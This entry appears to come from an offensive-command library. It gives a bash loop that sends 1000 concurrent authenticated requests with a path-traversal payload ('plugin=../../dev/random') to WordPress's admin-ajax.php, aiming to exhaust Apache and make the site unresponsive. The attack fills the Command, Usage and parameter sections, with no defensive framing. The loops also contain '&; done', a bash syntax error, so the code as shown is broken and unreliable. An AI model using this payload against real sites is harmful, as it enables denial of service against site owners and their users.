---
id: cmd-wordpress-dos-loop
data: >-
  for i in `seq 1 1000`; do curl --cookie "$cookiejar" --data
  "plugin=../../../../../../../../../../dev/random&action=update-plugin"
  "$target/wp-admin/admin-ajax.php" >/dev/null 2>&1 &; done
tags:
  - wordpress
  - dos
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.306Z'
verified: false
validated: true
submitted: true
---
# wordpress-dos-loop-curl

## Command

```bash
for i in `seq 1 1000`; do curl --cookie "$cookiejar" --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" "$target/wp-admin/admin-ajax.php" >/dev/null 2>&1 &; done
```

## Description

This bash loop sends 1000 concurrent POST requests to WordPress's admin-ajax.php using stored cookies, exploiting path traversal in the 'plugin' parameter to read /dev/random and cause resource exhaustion on the Apache server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for i in `seq 1 1000`` | Loops from 1 to 1000 iterations using seq command | Yes |
| `curl --cookie "$cookiejar"` | Loads authentication cookies from file | Yes |
| `--data "plugin=../../../../../../../../../../dev/random&action=update-plugin"` | POST payload with traversal to /dev/random and vulnerable action | Yes |
| `$target/wp-admin/admin-ajax.php` | Target Ajax endpoint | Yes |
| `>/dev/null 2>&1 &` | Suppresses output and runs each curl in background for concurrency | Yes |

## Examples

### Basic Usage

```bash
for i in `seq 1 1000`; do curl --cookie cookies.txt --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" "http://target.com/wp-admin/admin-ajax.php" >/dev/null 2>&1 &; done
```

### Advanced Usage

```bash
export target="http://target.com"; export cookiejar="cookies.txt"; for i in `seq 1 1000`; do curl --cookie "$cookiejar" --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" "$target/wp-admin/admin-ajax.php" >/dev/null 2>&1 &; done
```

## Expected Output

No visible output (suppressed); server-side, requests block on /dev/random reads, leading to Apache process exhaustion and site unresponsiveness.

## Related

- [[commands/wordpress-login-curl]]
- [[procedures/Exploit-WordPress-Ajax-Path-Traversal-for-DoS]]
